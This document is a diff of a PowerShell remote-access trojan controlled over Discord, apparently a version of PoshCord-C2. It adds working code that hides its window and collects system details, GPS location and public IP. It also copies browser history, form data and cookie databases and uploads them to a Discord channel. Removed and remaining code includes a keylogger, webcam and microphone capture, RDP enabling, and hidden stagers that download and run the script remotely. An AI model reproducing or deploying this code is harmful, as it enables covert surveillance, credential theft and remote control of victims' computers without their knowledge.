@@ -6,14 +6,15 @@ Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor i
 #>
 # =====================================================================================================================================================
 
-$token = "$tk" # make sure your bot is in the same server as the webhook
-$chan = "$ch" # make sure the bot AND webhook can access this channel
+$global:token = "$tk" # make sure your bot is in the same server as the webhook
 
 # =============================================================== SCRIPT SETUP =========================================================================
 
-$HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
+$HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
 $spawnChannels = 1 # Create new channel on session start
 $InfoOnConnect = 1 # Generate client info message on session start
+$defaultstart = 1 # Option to start all jobs automatically upon running
+
 $parent = "https://is.gd/bwdcc2" # parent script URL (for restarts and persistance)
 
 # remove restart stager (if present)
@@ -30,6 +31,226 @@ $timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
 
 # =============================================================== MODULE FUNCTIONS =========================================================================
 
+
+# Download ffmpeg.exe function (dependency for media capture) 
+Function GetFfmpeg{
+    sendMsg -Message ":hourglass: ``Downloading FFmpeg to Client.. Please Wait`` :hourglass:"
+    $Path = "$env:Temp\ffmpeg.exe"
+    $tempDir = "$env:temp"
+    If (!(Test-Path $Path)){  
+        $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
+        $wc = New-Object System.Net.WebClient           
+        $wc.Headers.Add("User-Agent", "PowerShell")
+        $response = $wc.DownloadString("$apiUrl")
+        $release = $response | ConvertFrom-Json
+        $asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
+        $zipUrl = $asset.browser_download_url
+        $zipFilePath = Join-Path $tempDir $asset.name
+        $extractedDir = Join-Path $tempDir ($asset.name -replace '.zip$', '')
+        $wc.DownloadFile($zipUrl, $zipFilePath)
+        Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
+        Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
+        rm -Path $zipFilePath -Force
+        rm -Path $extractedDir -Recurse -Force
+    }
+}
+
+# Create a new category for text channels function
+Function NewChannelCategory{
+    $headers = @{
+        'Authorization' = "Bot $token"
+    }
+    $guildID = $null
+    while (!($guildID)){    
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("Authorization", $headers.Authorization)    
+        $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
+        $guilds = $response | ConvertFrom-Json
+        foreach ($guild in $guilds) {
+            $guildID = $guild.id
+        }
+        sleep 3
+    }
+    $uri = "https://discord.com/api/guilds/$guildID/channels"
+    $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
+    $body = @{
+        "name" = "$env:COMPUTERNAME"
+        "type" = 4
+    } | ConvertTo-Json    
+    $wc = New-Object System.Net.WebClient
+    $wc.Headers.Add("Authorization", "Bot $token")
+    $wc.Headers.Add("Content-Type", "application/json")
+    $response = $wc.UploadString($uri, "POST", $body)
+    $responseObj = ConvertFrom-Json $response
+    Write-Host "The ID of the new category is: $($responseObj.id)"
+    $global:CategoryID = $responseObj.id
+}
+
+# Create a new channel function
+Function NewChannel{
+param([string]$name)
+    $headers = @{
+        'Authorization' = "Bot $token"
+    }    
+    $wc = New-Object System.Net.WebClient
+    $wc.Headers.Add("Authorization", $headers.Authorization)    
+    $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
+    $guilds = $response | ConvertFrom-Json
+    foreach ($guild in $guilds) {
+        $guildID = $guild.id
+    }
+    $uri = "https://discord.com/api/guilds/$guildID/channels"
+    $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
+    $body = @{
+        "name" = "$name"
+        "type" = 0
+        "parent_id" = $CategoryID
+    } | ConvertTo-Json    
+    $wc = New-Object System.Net.WebClient
+    $wc.Headers.Add("Authorization", "Bot $token")
+    $wc.Headers.Add("Content-Type", "application/json")
+    $response = $wc.UploadString($uri, "POST", $body)
+    $responseObj = ConvertFrom-Json $response
+    Write-Host "The ID of the new channel is: $($responseObj.id)"
+    $global:ChannelID = $responseObj.id
+}
+
+# Send a message or embed to discord channel function
+function sendMsg {
+    param([string]$Message,[string]$Embed)
+
+    $url = "https://discord.com/api/v10/channels/$SessionID/messages"
+    $wc = New-Object System.Net.WebClient
+    $wc.Headers.Add("Authorization", "Bot $token")
+
+    if ($Embed) {
+        $jsonBody = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
+        $wc.Headers.Add("Content-Type", "application/json")
+        $response = $wc.UploadString($url, "POST", $jsonBody)
+        if ($webhook){
+            $body = @{"username" = "Scam BOT" ;"content" = "$jsonBody"} | ConvertTo-Json
+            IRM -Uri $webhook -Method Post -ContentType "application/json" -Body $jsonBody
+        }
+        $jsonPayload = $null
+    }
+    if ($Message) {
+            $jsonBody = @{
+                "content" = "$Message"
+                "username" = "$env:computername"
+            } | ConvertTo-Json
+            $wc.Headers.Add("Content-Type", "application/json")
+            $response = $wc.UploadString($url, "POST", $jsonBody)
+	        $message = $null
+    }
+}
+
+function sendFile {
+    param([string]$sendfilePath)
+
+    $url = "https://discord.com/api/v10/channels/$SessionID/messages"
+    $webClient = New-Object System.Net.WebClient
+    $webClient.Headers.Add("Authorization", "Bot $token")
+    if ($sendfilePath) {
+        if (Test-Path $sendfilePath -PathType Leaf) {
+            $response = $webClient.UploadFile($url, "POST", $sendfilePath)
+            Write-Host "Attachment sent to Discord: $sendfilePath"
+        } else {
+            Write-Host "File not found: $sendfilePath"
+        }
+    }
+}
+
+# Gather System and user information
+Function quickInfo{
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -AssemblyName System.Device
+    $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
+    $GeoWatcher.Start()
+    while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {Sleep -M 100}  
+    if ($GeoWatcher.Permission -eq 'Denied'){$GPS = "Location Services Off"}
+    else{
+        $GL = $GeoWatcher.Position.Location | Select Latitude,Longitude;$GL = $GL -split " "
+    	$Lat = $GL[0].Substring(11) -replace ".$";$Lon = $GL[1].Substring(10) -replace ".$"
+        $GPS = "LAT = $Lat LONG = $Lon"
+    }
+    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
+        $adminperm = "False"
+    } else {
+        $adminperm = "True"
+    }
+    $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
+    $userInfo = Get-WmiObject -Class Win32_UserAccount
+    $processorInfo = Get-WmiObject -Class Win32_Processor
+    $computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
+    $userInfo = Get-WmiObject -Class Win32_UserAccount
+    $videocardinfo = Get-WmiObject Win32_VideoController
+    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen;$Width = $Screen.Width;$Height = $Screen.Height;$screensize = "${width} x ${height}"
+    $email = (Get-ComputerInfo).WindowsRegisteredOwner
+    $OSString = "$($systemInfo.Caption)"
+    $OSArch = "$($systemInfo.OSArchitecture)"
+    $RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
+    $processor = "$($processorInfo.Name)"
+    $gpu = "$($videocardinfo.Name)"
+    $ver = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
+    $systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
+    $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
+    $script:jsonPayload = @{
+        username   = $env:COMPUTERNAME
+        tts        = $false
+        embeds     = @(
+            @{
+                title       = "$env:COMPUTERNAME | Computer Information "
+                "description" = @"
+``````SYSTEM INFORMATION FOR $env:COMPUTERNAME``````
+:man_detective: **User Information** :man_detective:
+- **Current User**          : ``$env:USERNAME``
+- **Email Address**         : ``$email``
+- **Language**              : ``$systemLanguage``
+- **Administrator Session** : ``$adminperm``
+
+:minidisc: **OS Information** :minidisc:
+- **Current OS**            : ``$OSString - $ver``
+- **Architechture**         : ``$OSArch``
+
+:globe_with_meridians: **Network Information** :globe_with_meridians:
+- **Public IP Address**     : ``$computerPubIP``
+- **Location Information**  : ``$GPS``
+
+:desktop: **Hardware Information** :desktop:
+- **Processor**             : ``$processor`` 
+- **Memory**                : ``$RamInfo``
+- **Gpu**                   : ``$gpu``
+- **Screen Size**           : ``$screensize``
+
+``````COMMAND LIST``````
+- **Options**               : Show The Options Menu
+- **ExtraInfo**             : Show The Extra Info Menu
+- **Close**                 : Close this session
+
+"@
+                color       = 65280
+            }
+        )
+    }
+    sendMsg -Embed $jsonPayload -webhook $webhook
+}
+
+# Hide powershell console window function
+function HideWindow {
+    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+    $hwnd = (Get-Process -PID $pid).MainWindowHandle
+    if($hwnd -ne [System.IntPtr]::Zero){
+        $Type::ShowWindowAsync($hwnd, 0)
+    }
+    else{
+        $Host.UI.RawUI.WindowTitle = 'hideme'
+        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
+        $hwnd = $Proc.MainWindowHandle
+        $Type::ShowWindowAsync($hwnd, 0)
+    }
+}
+
 # --------------------------------------------------------------- HELP FUNCTIONS ------------------------------------------------------------------------
 
 Function Options {
@@ -42,11 +263,10 @@ $script:jsonPayload = @{
             "description" = @"
 - **SpeechToText**: Send audio transcript to Discord
 - **Systeminfo**: Send System info as text file to Discord
-- **QuickInfo**: Send a quick System info embed (sent on first connect)
 - **FolderTree**: Save folder trees to file and send to Discord
 - **EnumerateLAN**: Show devices on LAN (see ExtraInfo)
 - **NearbyWifi**: Show nearby wifi networks (!user popup!)
-- **ChromeDB**:  Gather Database files from Chrome and send to Discord
+- **BrowserDB**:  Gather Database files from Chrome and send to Discord
 
 - **AddPersistance**: Add this script to startup.
 - **RemovePersistance**: Remove Poshcord from startup
@@ -58,14 +278,14 @@ $script:jsonPayload = @{
 - **EnableIO**: Enable Keyboard and Mouse
 - **DisableIO**: Disable Keyboard and Mouse
 
-- **RecordAudio**: Record microphone and send to Discord
+- **Microphone**: Record microphone clips and send to Discord
 - **RecordScreen**: Record Screen and send to Discord
-- **TakePicture**: Send a webcam picture and send to Discord
+- **Webcam**: Stream webcam pictures to Discord
 - **Exfiltrate**: Send various files. (see ExtraInfo)
 - **Upload**: Upload a file. (see ExtraInfo)
 - **Download**: Download a file. (attach a file with the command)
 - **StartUvnc**: Start UVNC client `StartUvnc -ip 192.168.1.1 -port 8080`
-- **Screenshot**: Sends a screenshot of the desktop and send to Discord
+- **Screenshots**: Sends screenshots of the desktop to Discord
 - **Keycapture**: Capture Keystrokes and send to Discord
 
 - **FakeUpdate**: Spoof Windows-10 update screen using Chrome
@@ -77,7 +297,7 @@ $script:jsonPayload = @{
 - **VoiceMessage**: Send a message window to the User (!user popup!)
 - **MinimizeAll**: Send a voice message to the User
 - **EnableDarkMode**: Enable System wide Dark Mode
-- **DisableDarkMode**: Disable System wide Dark Mode\
+- **DisableDarkMode**: Disable System wide Dark Mode
 - **VolumeMax**: Maximise System Volume
 - **VolumeMin**: Minimise System Volume
 - **ShortcutBomb**: Create 50 shortcuts on the desktop.
@@ -87,10 +307,8 @@ $script:jsonPayload = @{
 
 - **ExtraInfo**: Get a list of further info and command examples
 - **Cleanup**: Wipe history (run prompt, powershell, recycle bin, Temp)
-- **Kill**: Stop a running module (eg. Keycapture / Exfiltrate)
-- **ControlAll**: Control all waiting sessions simultaneously
-- **ShowAll**: Show all waiting sessions in chat.
-- **Pause**: Pause the current authenticated session
+- **Kill**: Stop a running module (eg. Exfiltrate)
+- **PauseJobs**: Pause the current jobs for this session
 - **Close**: Close this session
 "@
             color       = 65280
@@ -155,6 +373,20 @@ Function CleanUp {
     Remove-Item (Get-PSreadlineOption).HistorySavePath
     reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
     Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+    $campath = "$env:Temp\Image.jpg"
+    $screenpath = "$env:Temp\Screen.jpg"
+    $micpath = "$env:Temp\Audio.mp3"
+    If (Test-Path $campath){  
+        rm -Path $campath -Force
+    }
+    If (Test-Path $screenpath){  
+        rm -Path $screenpath -Force
+    }
+    If (Test-Path $micpath){  
+        rm -Path $micpath -Force
+    }
+
     sendMsg -Message ":white_check_mark: ``Clean Up Task Complete`` :white_check_mark:"
 }
 
@@ -536,29 +768,49 @@ Function NearbyWifi {
     sendMsg -Message "``````$Wifi``````"
 }
 
-Function ChromeDB {
-    $sourceDir = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
-    $tempFolder = [System.IO.Path]::GetTempPath() + "loot"
-    if (!(Test-Path $tempFolder)){
-        New-Item -Path $tempFolder -ItemType Directory -Force
-    }
-    $filesToCopy = Get-ChildItem -Path $sourceDir -Filter '*' -Recurse | Where-Object { $_.Name -like 'Web Data' -or $_.Name -like 'History' }
-    foreach ($file in $filesToCopy) {
-        $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
-        $newFileName = $file.BaseName + "_" + $randomLetters + $file.Extension
-        $destination = Join-Path -Path $tempFolder -ChildPath $newFileName
-        Copy-Item -Path $file.FullName -Destination $destination -Force
-    }
-    $zipFileName = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "loot.zip")
-    Compress-Archive -Path $tempFolder -DestinationPath $zipFileName
-    $tempFolders = Get-ChildItem -Path $tempFolder -Directory
-    foreach ($folder in $tempFolders) {
-        if ($folder.Name -ne "loot") {
-            Remove-Item -Path $folder.FullName -Recurse -Force
+Function BrowserDB {
+
+    sendMsg -Message ":arrows_counterclockwise: ``Getting Browser DB Files..`` :arrows_counterclockwise:"
+    $temp = [System.IO.Path]::GetTempPath() 
+    $tempFolder = Join-Path -Path $temp -ChildPath 'dbfiles'
+    $googledest = Join-Path -Path $tempFolder -ChildPath 'google'
+    $mozdest = Join-Path -Path $tempFolder -ChildPath 'firefox'
+    $edgedest = Join-Path -Path $tempFolder -ChildPath 'edge'
+    New-Item -Path $tempFolder -ItemType Directory -Force
+    sleep 1
+    New-Item -Path $googledest -ItemType Directory -Force
+    New-Item -Path $mozdest -ItemType Directory -Force
+    New-Item -Path $edgedest -ItemType Directory -Force
+    sleep 1
+    
+    Function CopyFiles {
+        param ([string]$dbfile,[string]$folder,[switch]$db)
+        $filesToCopy = Get-ChildItem -Path $dbfile -Filter '*' -Recurse | Where-Object { $_.Name -like 'Web Data' -or $_.Name -like 'History' -or $_.Name -like 'formhistory.sqlite' -or $_.Name -like 'places.sqlite' -or $_.Name -like 'cookies.sqlite'}
+        foreach ($file in $filesToCopy) {
+            $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
+            if ($db -eq $true){
+                $newFileName = $file.BaseName + "_" + $randomLetters + $file.Extension + '.db'
+            }
+            else{
+                $newFileName = $file.BaseName + "_" + $randomLetters + $file.Extension 
+            }
+            $destination = Join-Path -Path $folder -ChildPath $newFileName
+            Copy-Item -Path $file.FullName -Destination $destination -Force
         }
-    }
+    } 
+    
+    $script:googleDir = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
+    $script:firefoxDir = Get-ChildItem -Path "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles" -Directory | Where-Object { $_.Name -like '*.default-release' };$firefoxDir = $firefoxDir.FullName
+    $script:edgeDir = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data"
+    copyFiles -dbfile $googleDir -folder $googledest -db
+    copyFiles -dbfile $firefoxDir -folder $mozdest
+    copyFiles -dbfile $edgeDir -folder $edgedest -db
+    $zipFileName = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "dbfiles.zip")
+    Compress-Archive -Path $tempFolder -DestinationPath $zipFileName
     Remove-Item -Path $tempFolder -Recurse -Force
     sendFile -sendfilePath $zipFileName
+    sleep 1
+    Remove-Item -Path $zipFileName -Recurse -Force
 }
 
 # --------------------------------------------------------------- PRANK FUNCTIONS ------------------------------------------------------------------------
@@ -671,6 +923,7 @@ Function MinimizeAll{
 Function EnableDarkMode {
     $Theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
     Set-ItemProperty $Theme AppsUseLightTheme -Value 0
+    Set-ItemProperty $Theme SystemUsesLightTheme -Value 0
     Start-Sleep 1
     sendMsg -Message ":white_check_mark: ``Dark Mode Enabled`` :white_check_mark:"
 }
@@ -678,6 +931,7 @@ Function EnableDarkMode {
 Function DisableDarkMode {
     $Theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
     Set-ItemProperty $Theme AppsUseLightTheme -Value 1
+    Set-ItemProperty $Theme SystemUsesLightTheme -Value 1
     Start-Sleep 1
     sendMsg -Message ":octagonal_sign: ``Dark Mode Disabled`` :octagonal_sign:"
 }
@@ -713,9 +967,9 @@ Function ShortcutBomb {
 
 Function Wallpaper {
 param ([string[]]$url)
-$outputPath = "$env:temp\img.jpg";$wallpaperStyle = 2;IWR -Uri $url -OutFile $outputPath
-$signature = 'using System;using System.Runtime.InteropServices;public class Wallpaper {[DllImport("user32.dll", CharSet = CharSet.Auto)]public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);}'
-Add-Type -TypeDefinition $signature;$SPI_SETDESKWALLPAPER = 0x0014;$SPIF_UPDATEINIFILE = 0x01;$SPIF_SENDCHANGE = 0x02;[Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $outputPath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)
+    $outputPath = "$env:temp\img.jpg";$wallpaperStyle = 2;IWR -Uri $url -OutFile $outputPath
+    $signature = 'using System;using System.Runtime.InteropServices;public class Wallpaper {[DllImport("user32.dll", CharSet = CharSet.Auto)]public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);}'
+    Add-Type -TypeDefinition $signature;$SPI_SETDESKWALLPAPER = 0x0014;$SPIF_UPDATEINIFILE = 0x01;$SPIF_SENDCHANGE = 0x02;[Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $outputPath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)
     sendMsg -Message ":white_check_mark: ``New Wallpaper Set`` :white_check_mark:"
 }
 
@@ -732,7 +986,7 @@ Function Goose {
 }
 
 Function ScreenParty {
-Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C Add-Type -AssemblyName System.Windows.Forms;`$d = 10;`$i = 100;`$1 = 'Black';`$2 = 'Green';`$3 = 'Red';`$4 = 'Yellow';`$5 = 'Blue';`$6 = 'white';`$st = Get-Date;while ((Get-Date) -lt `$st.AddSeconds(`$d)) {`$t = 1;while (`$t -lt 7){`$f = New-Object System.Windows.Forms.Form;`$f.BackColor = `$c;`$f.FormBorderStyle = 'None';`$f.WindowState = 'Maximized';`$f.TopMost = `$true;if (`$t -eq 1) {`$c = `$1}if (`$t -eq 2) {`$c = `$2}if (`$t -eq 3) {`$c = `$3}if (`$t -eq 4) {`$c = `$4}if (`$t -eq 5) {`$c = `$5}if (`$t -eq 6) {`$c = `$6}`$f.BackColor = `$c;`$f.Show();Start-Sleep -Milliseconds `$i;`$f.Close();`$t++}}")
+    Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C Add-Type -AssemblyName System.Windows.Forms;`$d = 10;`$i = 100;`$1 = 'Black';`$2 = 'Green';`$3 = 'Red';`$4 = 'Yellow';`$5 = 'Blue';`$6 = 'white';`$st = Get-Date;while ((Get-Date) -lt `$st.AddSeconds(`$d)) {`$t = 1;while (`$t -lt 7){`$f = New-Object System.Windows.Forms.Form;`$f.BackColor = `$c;`$f.FormBorderStyle = 'None';`$f.WindowState = 'Maximized';`$f.TopMost = `$true;if (`$t -eq 1) {`$c = `$1}if (`$t -eq 2) {`$c = `$2}if (`$t -eq 3) {`$c = `$3}if (`$t -eq 4) {`$c = `$4}if (`$t -eq 5) {`$c = `$5}if (`$t -eq 6) {`$c = `$6}`$f.BackColor = `$c;`$f.Show();Start-Sleep -Milliseconds `$i;`$f.Close();`$t++}}")
     sendMsg -Message ":white_check_mark: ``Screen Party Started!`` :white_check_mark:"  
 }
 
@@ -882,50 +1136,6 @@ Function StartUvnc{
     
 }
 
-Function TakePicture {
-    $tempDir = "$env:temp"
-    $imagePath = Join-Path -Path $tempDir -ChildPath "webcam_image.jpg"
-    $Input = (Get-CimInstance Win32_PnPEntity | ? {$_.PNPClass -eq 'Camera'} | select -First 1).Name
-    .$env:Temp\ffmpeg.exe -f dshow -i video="$Input" -frames:v 1 -y $imagePath
-    sleep 1
-    sendFile -sendfilePath $imagePath | Out-Null
-    sleep 3
-    Remove-Item -Path $imagePath -Force
-}
-
-Function Screenshot {
-    $Path = "$env:Temp\ffmpeg.exe"
-    If (!(Test-Path $Path)){  
-        GetFfmpeg
-    }
-    sendMsg -Message ":arrows_counterclockwise: ``Taking a screenshot..`` :arrows_counterclockwise:"
-    $mkvPath = "$env:Temp\ScreenClip.jpg"
-    .$env:Temp\ffmpeg.exe -f gdigrab -i desktop -frames:v 1 -vf "fps=1" $mkvPath
-    sleep 2
-    sendFile -sendfilePath $mkvPath | Out-Null
-    sleep 5
-    rm -Path $mkvPath -Force
-}
-
-Function RecordAudio{
-param ([int[]]$t)
-    $Path = "$env:Temp\ffmpeg.exe"
-    If (!(Test-Path $Path)){  
-        GetFfmpeg
-    }
-    sleep 1
-    sendMsg -Message ":arrows_counterclockwise: ``Recording audio for $t seconds..`` :arrows_counterclockwise:"
-    Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system
-    function getFriendlyName($id) {$reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id";return (get-ItemProperty $reg).FriendlyName}
-    $id1 = [audio]::GetDefault(1);$MicName = "$(getFriendlyName $id1)"; Write-Output $MicName
-    $mp3Path = "$env:Temp\AudioClip.mp3"
-    if ($t.Length -eq 0){$t = 10}
-    .$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t $t -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $mp3Path
-    sendFile -sendfilePath $mp3Path | Out-Null
-    sleep 5
-    rm -Path $mp3Path -Force
-}
-
 Function RecordScreen{
 param ([int[]]$t)
     $Path = "$env:Temp\ffmpeg.exe"
@@ -940,69 +1150,6 @@ param ([int[]]$t)
     sendFile -sendfilePath $mkvPath | Out-Null
     sleep 5
     rm -Path $mkvPath -Force
-}
-
-Function KeyCapture {
-
-    sendMsg -Message ":mag_right: ``Keylog Started`` :mag_right:"
-    $API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
-    $API = Add-Type -M $API -Name 'Win32' -Names API -PassThru
-    $LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
-    # Change for frequency
-    $KeypressThreshold = [TimeSpan]::FromSeconds(10)
-    While ($true){
-        $keyPressed = $false
-        try{
-        while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
-            Start-Sleep -Milliseconds 30
-            for ($asc = 8; $asc -le 254; $asc++){
-            $keyst = $API::GetAsyncKeyState($asc)
-                if ($keyst -eq -32767) {
-                $keyPressed = $true
-                $LastKeypressTime.Restart()
-                $null = [console]::CapsLock
-                $vtkey = $API::MapVirtualKey($asc, 3)
-                $kbst = New-Object Byte[] 256
-                $checkkbst = $API::GetKeyboardState($kbst)
-                $logchar = New-Object -TypeName System.Text.StringBuilder          
-                    if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
-                    $LString = $logchar.ToString()
-                        if ($asc -eq 8) {$LString = "[BKSP]"}
-                        if ($asc -eq 13) {$LString = "[ENTER]"}
-                        if ($asc -eq 27) {$LString = "[ESCAPE]"}
-                        $nosave += $LString 
-                        }
-                    }
-                }
-            }
-            PullMsg
-            if ($response -like "kill") {
-            sendMsg -Message ":mag_right: ``Keylog Stopped`` :octagonal_sign:"
-            $script:previouscmd = $response
-	    $VBpath = "C:\Windows\Tasks\service.vbs"
-            $tobat = @"
-Set WshShell = WScript.CreateObject(`"WScript.Shell`")
-WScript.Sleep 200
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; `$ch='$chan'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
-"@
-            $tobat | Out-File -FilePath $VBpath -Force
-            sleep 1
-            & $VBpath
-            exit
-            }
-        }
-        finally{
-            PullMsg
-            If (($keyPressed) -and (!($response -like "kill"))) {
-                $escmsgsys = $nosave -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
-                sendMsg -Message ":mag_right: ``Keys Captured :`` $escmsgsys"
-                $keyPressed = $false
-                $nosave = ""
-            }
-        }
-    $LastKeypressTime.Restart()
-    Start-Sleep -Milliseconds 10
-    }
 }
 
 # --------------------------------------------------------------- ADMIN FUNCTIONS ------------------------------------------------------------------------
@@ -1025,7 +1172,7 @@ If Not WScript.Arguments.Named.Exists(`"elevate`") Then
     , `"`"`"`" & WScript.ScriptFullName & `"`"`" /elevate`", `"`", `"runas`", 1
   WScript.Quit
 End If
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -C `$tk='$token'; `$ch='$chan'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -C `$tk='$token'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
 "@
     $pth = "C:\Windows\Tasks\service.vbs"
     $tobat | Out-File -FilePath $pth -Force
@@ -1055,13 +1202,6 @@ Function ExcludeALLDrives {
     sendMsg -Message ":white_check_mark: ``All Drives C:/ - G:/ Excluded`` :white_check_mark:"
 }
 
-Function EnableRDP {
-    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
-    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0
-    sendMsg -Message ":white_check_mark: ``RDP Enabled`` :white_check_mark:"
-}
-
 Function EnableIO{
     $signature = '[DllImport("user32.dll", SetLastError = true)][return: MarshalAs(UnmanagedType.Bool)]public static extern bool BlockInput(bool fBlockIt);'
     Add-Type -MemberDefinition $signature -Name User32 -Namespace Win32Functions
@@ -1078,82 +1218,268 @@ Function DisableIO{
 
 # =============================================================== MAIN FUNCTIONS =========================================================================
 
-Function quickInfo{
-Add-Type -AssemblyName System.Windows.Forms
-if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
-    $adminperm = "False"
-} else {
-    $adminperm = "True"
-}
-$systemInfo = Get-WmiObject -Class Win32_OperatingSystem
-$userInfo = Get-WmiObject -Class Win32_UserAccount
-$processorInfo = Get-WmiObject -Class Win32_Processor
-$computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
-$userInfo = Get-WmiObject -Class Win32_UserAccount
-$videocardinfo = Get-WmiObject Win32_VideoController
-$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen;$Width = $Screen.Width;$Height = $Screen.Height;$screensize = "${width} x ${height}"
-$email = (Get-ComputerInfo).WindowsRegisteredOwner
-$OSString = "$($systemInfo.Caption)"
-$OSArch = "$($systemInfo.OSArchitecture)"
-$RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
-$processor = "$($processorInfo.Name)"
-$gpu = "$($videocardinfo.Name)"
-$ver = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
